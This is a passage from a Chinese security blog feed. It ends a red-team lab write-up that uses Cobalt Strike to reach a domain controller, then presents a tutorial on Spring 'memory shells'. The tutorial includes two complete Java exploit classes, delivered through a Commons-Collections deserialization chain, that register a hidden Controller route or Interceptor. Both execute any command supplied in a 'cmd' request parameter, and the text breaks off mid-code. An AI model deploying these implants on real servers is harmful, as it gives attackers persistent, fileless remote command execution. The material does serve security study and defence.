src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/33.png" class><p>成功添加用户到管理员组，接下来使用 Cobalt Strike，执行net view查看共享的资源</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/34.png" class><p>成功发现域控主机，利用我们添加的用户横向登录到域控，选择横向移动，psexec，添加SMB的监听器</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/35.png" class><p>登录成功，开启一个会话交互，执行systeminfo命令</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/36.png" class><p>成功拿下域控机器，到此靶场渗透结束</p><h2 id="0x04-结语与反思"><a href="#0x04-结语与反思" class="headerlink" title="0x04 结语与反思"></a>0x04 结语与反思</h2><p>第一次打内网靶场，路程还是挺艰辛的。外网打点还是比较轻松的，打到内网 Windows 主机就不知道怎么搞了，跟着别的师傅的教程也算是打完了，后续会对Windows主机的命令操作以及 Cobalt Strike 和MSF渗透工具的深入使用。以下是我参考的文章链接：</p><p><a href="https://www.freebuf.com/articles/web/324441.html">ATT&amp;CK红队评估（红日靶场一）</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring内存马浅析</title>
      <link href="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/"/>
      <url>/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>前端时间学习完tomcat相关的内存马，由于一道ctf题的契机，打算再了解一下spring的内存马构造，于是有了下文，文章也是拖了很久才完成。</p><h2 id="0x01-Spring概述"><a href="#0x01-Spring概述" class="headerlink" title="0x01 Spring概述"></a>0x01 Spring概述</h2><p>Spring框架是一个开源的轻量级的java应用框架，它提供了一个全面的编程和配置模型，用于构建现代的、可扩展的Java应用程序。Spring的设计目标是提高Java应用程序的开发速度、模块化性、可维护性和测试性。</p><p>Spring有几种特性</p><p><strong>依赖注入</strong></p><p>依赖注入只是一个模糊的概念，你不用从代码层面上去创建对象，只需要通过在配置文件里描述对象创建的过程，以及创建对象所需要的条件，之后容器（也就是IOC容器）会读取xml配置文件的内容，并将它们组装成一个对象。</p><p><strong>面向切面编程（AOP）</strong></p><p>AOP也就是面向切面编程，顾名思义，实现一个切面，比如你定义好了一个类，在这个类中间切一刀，然后在这个地方添加一些新的东西，在实例化这个类或者调用这个类的某些方法的时候就会去执行我们添加的东西。有点类似于tomcat里面的Filter过滤器。</p><p><strong>IOC容器</strong></p><p>IOC翻译过来也就是控制反转，不是一种技术，而是设计思想。在传统的java SE设计模式中，我们直接在对象内部通过new进行创建对象，是程序主动去创建依赖对象，而IOC设计了一个专门的容器，也就是IOC容器，即由Ioc容器来控制对 象的创建（也就是Bean的创建，Bean是Spring容器的骨干）传统应用程序是由我们自己在对象中主动控制去直接获取依赖对象，而IOC是由容器帮我们查找及注入依赖对象，对象只是被动的接受依赖对象，所以反转了。</p><h2 id="0x02-Springboot环境搭建"><a href="#0x02-Springboot环境搭建" class="headerlink" title="0x02 Springboot环境搭建"></a>0x02 Springboot环境搭建</h2><p>spring搭建的时候需要写很多配置文件，很麻烦。Spring Boot是一个构建基于Spring的应用程序的工具，它旨在简化Spring应用程序的开发和部署。</p><p>新建项目，选择Spring模块</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/1.png" class><p>勾选Spring Web模块</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/2.png" class><p>选择2.x版本的Springboot版本</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/3.png" class><p>点击完成后，一个springboot就搭建好了，</p><p>为了模拟真实漏洞环境，在pom.xml文件中添加CC依赖，利用反序列化去注入内存马</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/4.png" class><p>设置一个根路由和反序列化路由</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/5.png" class><p>启动Springboot项目，访问根路由</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/6.png" class><p>环境搭建完成</p><h2 id="0x03-内存马流程分析"><a href="#0x03-内存马流程分析" class="headerlink" title="0x03 内存马流程分析"></a>0x03 内存马流程分析</h2><p>本文对于spring内存马的学习主要分为两种，一种是Controller内存马，另一种是Interceptor内存马。</p><h3 id="1-Controller内存马分析"><a href="#1-Controller内存马分析" class="headerlink" title="1.Controller内存马分析"></a>1.Controller内存马分析</h3><p>在控制器中的hello方法下个断点，看一下执行流</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/7.png" class><p>重点逻辑在 DispatcherServlet 类中的 doDispatch 方法，</p><p>通过请求的request寻找对应的handler类</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/8.png" class><p>跟进，遍历Mappings，然后调用Mapping的getHandler函数，一直跟进</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/9.png" class><p>通过当前请求对象查找路径，mappingRegistry，看字面意思就是注册mapping的，然后调用 lookupHandlerMethod 通过路径来查找对应处理逻辑的方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/10.png" class><p>继续跟进这个方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/11.png" class><p>最终是在 mappingRegistry 中查找对应mapping的，通过 getMappingsByDirectPath 方法，获得的Mappinginfo添加到list列表里</p><p>我们可以看看获取到的Mappinginfo是什么</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/12.png" class><p>里面存储着控制器的方法，所以在注册内存马的时候，需要封装一个Mapping动态注册到 mappingRegistry 里，全局查找在哪些地方调用了 this.mappingRegistry </p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/13.png" class><p>继续跟进这个register方法，主要看一下这个方法对应的三个参数</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/14.png" class><p>第二个参数 handler 就是对应的控制器类，第三个参数method就是一个Method类，这个类也可以通过反射获取，这两个类作为参数创建了一个handlerMethod类</p><p>第二个参数mapping，主要与路径有关</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/15.png" class><p>它是一个RequestMappingInfo类，在它的字段中只有 patternsCondition 字段与路径有关，其他的都默认为空。</p><p>而在 patternsCondition 字段中</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/16.png" class><p>有patterns字段是真正存储路由的，而在这个类的构造方法中也对patterns字段进行了赋值。</p><h4 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h4><blockquote><p>1.实例化控制器类作为handler</p><p>2.在控制器类构造恶意方法，反射获取Method类</p><p>3.构造一个patternsCondition，将恶意路由添加进去，实例化 RequestMappingInfo 类，把patternsCondition字段放进去</p><p>4.获取上下文，调用 registerMapping 方法注册路由</p></blockquote><h4 id="获取上下文"><a href="#获取上下文" class="headerlink" title="获取上下文"></a>获取上下文</h4><p>所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>然后从当前上下文中获取 RequestMappingHandlerMapping 的实例Bean</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><p>registerMapping 方法是在 AbstractHandlerMethodMapping 类中，而它是一个抽象类，所以要去往下找继承类</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/17.png" class><p>所以我们要获取RequestMappingHandlerMapping继承类来调用 registerMapping 方法。</p><h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><p>利用CC链打反序列化，加载恶意字节码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> attackTest;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">ShellMethod</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; C = TestShell.class;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ShellMethod = C.getMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/evalTest&quot;</span>);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TestShell</span> <span class="variable">testShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestShell</span>();</span><br><span class="line">        r.registerMapping(info, testShell, ShellMethod);</span><br><span class="line">        System.out.println(<span class="string">&quot;注入成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;success!!&quot;</span>);</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                httpServletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                httpServletResponse.getOutputStream().flush();</span><br><span class="line">                httpServletResponse.getOutputStream().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><p>将上述exp编译成 class文件 运行CC11攻击链生成payload 启动Springboot项目，</p><p>访问attack路由，将payload打进去</p><p>可以看到控制台有输出日志，说明内存马注入成功</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/18.png" class><p>访问注册时的指定路由 &#x2F;evalTest</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/19.png" class><p>可以执行任意命令</p><h3 id="2-Interceptor内存马分析"><a href="#2-Interceptor内存马分析" class="headerlink" title="2.Interceptor内存马分析"></a>2.Interceptor内存马分析</h3><p>Interceptor 也是拦截器，与filter过滤器很像。上文讲的Controller内存马对于存在相关拦截器的时候，Controller内存马就无法利用了，Interceptor比Controller先调用，所以Controller内存马不能作为通用的内存马。</p><h4 id="创建Interceptor"><a href="#创建Interceptor" class="headerlink" title="创建Interceptor"></a>创建Interceptor</h4><p>同Filter一样，我们可以自定义一个拦截器，对拦截器的定义有两种方法</p><blockquote><p>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义；</p><p>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</p></blockquote><p>选择继承 HandlerInterceptor 接口，重写接口的三个方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> MyInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;preHandle.....&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 返回true表示继续执行后续请求处理，返回false表示终止请求处理</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;postHandle.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;afterCompletion.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外还有对拦截器进行配置，编写applicationContext.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/*&quot;</span>/&gt;</span> <span class="comment">&lt;!-- 设置拦截路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;MyInterceptor.TestInterceptor&quot;</span>/&gt;</span> <span class="comment">&lt;!-- 拦截器类的完全限定名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然这还没完，在启动程序里将xml配置文件加载</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@ImportResource(&quot;classpath:applicationContext.xml&quot;)</span><br></pre></td></tr></table></figure><p>为了演示效果更明显，在控制器中添加一句日志</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/20.png" class><p>启动springboot项目，访问根路由</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/21.png" class><p>由此可见，拦截器中的preHandle函数比Controller更先执行，更适合作为内存马</p><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>从执行流中找，定位到 DispatcherServlet 类的 doDispatch 方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/22.png" class><p>在这个调用中可以发现此时 mappedHandler 已经添加了自定义的拦截器</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/23.png" class><p>把目标锁定在mappedHandler 的创建</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/24.png" class><p>跟进 getHandler 方法调试。</p><p>刚开始的流程和 Controller 内存马的流程分析类似，不再赘述，直接跳到 AbstractHandlerMapping 类中的 HandlerExecutionChain 方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/25.png" class><p>此时拿到了对应控制器的handler，往下走，经过一些判断</p><p>到516行有个重要方法 getHandlerExecutionChain </p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/26.png" class><p>跟进这个方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/27.png" class><p>首先创建了一个 HandlerExecutionChain 类的实例，然后遍历 adaptedInterceptors 拦截器列表</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/28.png" class><p>可以看到此时列表中有三个拦截器，第一个就对应我们自定义的拦截器，回到代码，判断遍历的拦截器是否继承 MappedInterceptor 类，然后对请求的路径进行匹配，满足条件后就将自定义的拦截器添加到链中</p><p>拦截器方法的调用是在 DispatcherServlet 类的 doDispatch 方法，第1062行</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/29.png" class><p>跟进这个方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/30.png" class><p>先从拦截器列表中获取下标为0的拦截器，也正是我们自定义的，然后调用它的 preHandle 方法，无论是什么拦截器，都会调用它的 preHandle 方法</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/31.png" class><p>最后就来到了日志打印</p><p>到此 Interceptor 的流程分析结束。</p><h4 id="构造思路-1"><a href="#构造思路-1" class="headerlink" title="构造思路"></a>构造思路</h4><p>仔细回想拦截器添加到执行的过程，根本的点在于 adaptedInterceptors 属性</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/32.png" class><p>它是 AbstractHandlerMapping 接口的一个属性</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/33.png" class><p>我们只需要创建一个恶意的拦截器，然后调用add方法将恶意拦截器添加到该属性中。</p><p>其实也比较简单，完整的exp为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> attackTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInterceptorShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">MyInterceptorShell</span> <span class="variable">myInterceptorShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInterceptorShell</span>();</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(AbstractHandlerMapping.class);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">adaptedInterceptorsField</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            adaptedInterceptorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) adaptedInterceptorsField.get(abstractHandlerMapping);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            adaptedInterceptors.add(myInterceptorShell);</span><br><span class="line">            System.out.println(<span class="string">&quot;内存马注入成功!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span> <span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span></span><br><span class="line">    Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuffer.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            response.getOutputStream().write(stringBuffer.toString().getBytes());</span><br><span class="line">            response.getOutputStream().flush();</span><br><span class="line">            response.getOutputStream().close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator 